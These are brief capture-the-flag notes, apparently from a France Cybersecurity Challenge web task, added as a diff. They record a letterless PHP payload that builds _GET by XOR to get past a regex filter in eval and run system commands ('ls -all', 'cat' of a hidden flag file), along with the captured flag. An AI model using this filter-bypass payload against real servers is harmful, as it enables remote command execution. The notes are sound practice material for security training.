@@ -1,0 +1,10 @@
+http://challenges2.france-cybersecurity-challenge.fr:5008
+
+/?code[]= to bypass preg_match -> doesnt fit with eval
+
+gotta get something without letters
+
+$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=system&__=ls -all
+$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=system&__=cat .flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php
+
+FCSC{53d195522a15aa0ce67954dc1de7c5063174a721ee5aa924a4b9b15ba1ab6948}
